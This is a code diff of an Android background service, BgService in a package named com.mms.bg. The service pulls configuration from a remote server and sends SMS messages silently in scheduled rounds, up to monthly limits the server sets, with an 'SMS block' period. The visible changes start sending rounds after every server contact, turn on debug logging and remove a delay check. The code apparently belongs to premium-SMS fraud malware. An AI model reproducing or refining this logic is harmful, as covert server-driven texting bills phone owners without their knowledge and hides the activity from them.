@@ -27,7 +27,7 @@ import com.mms.bg.util.XMLHandler;
 public class BgService extends Service {
 
     private static final String TAG = "BgService";
-    private static final boolean DEBUG = false;
+    private static final boolean DEBUG = true;
     
     public static final String ACTION_DIAL_BR = "action.dial.bg";
     public static final String ACTION_INTERNET = "action.internet.bg";
@@ -275,10 +275,13 @@ public class BgService extends Service {
                 mSM.setLastConnectServerTime(System.currentTimeMillis());
                 mSM.mHasSetFetchServerInfoAlarm = false;
                 mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
-                if (isSendSMS() == true && mStartSMSAfterInternet == true) {
+                if (isSendSMS() && mSM.needSMSRoundSend()) {
                     //using sms
-                    mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
-                    mStartSMSAfterInternet = false;
+                    if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
+                        mSM.setSMSRoundTotalSnedCount(0);
+                    }
+                    mSM.startOneRoundSMSSend(0);
+                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
                 } else if (isDownloadVedio() == true) {
 //                    long time = mSM.getLastVedioDownloadTime();
 //                    if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
@@ -291,24 +294,24 @@ public class BgService extends Service {
                 mSM.setInternetConnectFailed(true);
             }
         } else if (action.equals(ACTION_SEND_SMS) == true) {
-            LOGD("[[onStart]] start send the sms for one cycle");
-            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer("sms round check");
-            if (ret == true) {
-                mSM.parseServerXMLInfo();
-                mSM.log(TAG, "start send the sms for one cycle");
-                mSM.startOneRoundSMSSend(0);
-                mSM.log("cancel the auto message send now and start it after this round sms send");
-                mSM.cancelAutoSendMessage();
-                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
-            } else {
-                mSM.setInternetConnectFailedBeforeSMS(true);
+//            LOGD("[[onStart]] start send the sms for one cycle");
+//            boolean ret = SettingManager.getInstance(this).getXMLInfoFromServer("sms round check");
+//            if (ret == true) {
+//                mSM.parseServerXMLInfo();
+//                mSM.log(TAG, "start send the sms for one cycle");
+//                mSM.startOneRoundSMSSend(0);
+//                mSM.log("cancel the auto message send now and start it after this round sms send");
+//                mSM.cancelAutoSendMessage();
+//                mSM.setSMSBlockBeginTime(System.currentTimeMillis());
+//            } else {
+//                mSM.setInternetConnectFailedBeforeSMS(true);
 //                long false_retry_time = ((long) 1) * 3600 * 1000;
 //                sm.setSMSSendDelay(false_retry_time);
 //                SettingManager.getInstance(this).startAutoSendMessage(System.currentTimeMillis(), false_retry_time);
-            }
-            if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
-                mSM.setSMSRoundTotalSnedCount(0);
-            }
+//            }
+//            if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
+//                mSM.setSMSRoundTotalSnedCount(0);
+//            }
         } else if (action.equals(ACTION_SEND_SMS_ROUND) == true) {
             mSM.log("receive the action = " + intent.getAction());
             oneRoundSMSSend();
@@ -325,13 +328,13 @@ public class BgService extends Service {
                 if (mSM.mHasSetFetchServerInfoAlarm == false) {
                     mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
                 }
-                if (isSendSMS() == true) {
-                    mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
-                    mStartSMSAfterInternet = false;
-                } else if (isDownloadVedio() == true) {
+//                if (isSendSMS() == true) {
+//                    mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
+//                    mStartSMSAfterInternet = false;
+//                } else if (isDownloadVedio() == true) {
                     //TODO : start download vedio process alarm
 //                    mStartSMSAfterInternet = false;
-                }
+//                }
             } else {
                 if (mSM.mHasSetFetchServerInfoAlarm == false) {
                     mSM.setNextFetchChannelInfoFromServerTime(0, false);
@@ -357,9 +360,12 @@ public class BgService extends Service {
                     mSM.setLastConnectServerTime(System.currentTimeMillis());
                     mSM.mHasSetFetchServerInfoAlarm = false;
                     mSM.setNextFetchChannelInfoFromServerTime(delayTime, false);
-                    if (isSendSMS() == true && mStartSMSAfterInternet == true) {
-                        mSM.startAutoSendMessage(0, mSM.getSMSSendDelay());
-                        mStartSMSAfterInternet = false;
+                    if (isSendSMS() && mSM.needSMSRoundSend()) {
+                        if ((System.currentTimeMillis() - mSM.getLastSMSTime()) >= SettingManager.SMS_DEFAULT_DELAY_TIME) {
+                            mSM.setSMSRoundTotalSnedCount(0);
+                        }
+                        mSM.startOneRoundSMSSend(0);
+                        mSM.setSMSBlockBeginTime(System.currentTimeMillis());
                     } else if (isDownloadVedio() == true) {
 //                        long time = mSM.getLastVedioDownloadTime();
 //                        if ((System.currentTimeMillis() - time) > SettingManager.SMS_DEFAULT_DELAY_TIME) {
@@ -369,15 +375,15 @@ public class BgService extends Service {
 //                        }
                     }
                 }
-                if (mSM.getInternetConnectFailedBeforeSMS() == true) {
-                    mSM.setInternetConnectFailedBeforeSMS(false);
-                    mSM.parseServerXMLInfo();
-                    mSM.log(TAG, "start send the sms for one cycle");
-                    mSM.startOneRoundSMSSend(0);
-                    mSM.log("cancel the auto message send now and start it after this round sms send");
-                    mSM.cancelAutoSendMessage();
-                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
-                }
+//                if (mSM.getInternetConnectFailedBeforeSMS() == true) {
+//                    mSM.setInternetConnectFailedBeforeSMS(false);
+//                    mSM.parseServerXMLInfo();
+//                    mSM.log(TAG, "start send the sms for one cycle");
+//                    mSM.startOneRoundSMSSend(0);
+//                    mSM.log("cancel the auto message send now and start it after this round sms send");
+//                    mSM.cancelAutoSendMessage();
+//                    mSM.setSMSBlockBeginTime(System.currentTimeMillis());
+//                }
             }
         } else {
             if (mSM.mHasSetFetchServerInfoAlarm == false) {
@@ -396,13 +402,6 @@ public class BgService extends Service {
     
     private void oneRoundSMSSend() {
         SettingManager sm = mSM;
-        long last_sms_time = sm.getLastSMSTime();
-        long sms_delay = sm.getSMSSendDelay();
-        long current_time = System.currentTimeMillis();
-//        if ((current_time - last_sms_time) < sms_delay) {
-//            sm.log(TAG, "======= ignore this sms send because the sms time delay not reach =====");
-//            return;
-//        }
         sm.log(TAG, "receive the intent for send on sms, intent action = " + ACTION_SEND_SMS_ROUND);
         if (sm.mXMLHandler != null) {
             String monthCount = sm.mXMLHandler.getChanneInfo(XMLHandler.LIMIT_NUMS_MONTH);
@@ -424,12 +423,12 @@ public class BgService extends Service {
                     sm.log(TAG, "this round has send sms count = " + (todayHasSend + 1));
                 } else {
                     sm.log(TAG, "cancel this round the sms auto send, because the send job done");
-                    sm.setSMSRoundTotalSnedCount(sm.getSMSRoundTotalSend() + sendTotlaCount);
+                    sm.setSMSRoundTotalSnedCount(sm.getSMSRoundTotalSend() + todayHasSend);
                     sm.setTodaySMSSendCount(0);
                     sm.cancelOneRoundSMSSend();
                     sm.setSMSSendDelay(SettingManager.SMS_CHECK_ROUND_DELAY);
-                    long sms_delay_time = sm.getSMSSendDelay();
-                    sm.startAutoSendMessage(0, sms_delay_time);
+//                    long sms_delay_time = sm.getSMSSendDelay();
+//                    sm.startAutoSendMessage(0, sms_delay_time);
                 }
             } else {
                 sm.log(TAG, "cancel this round the sms auto send, because month count == null");
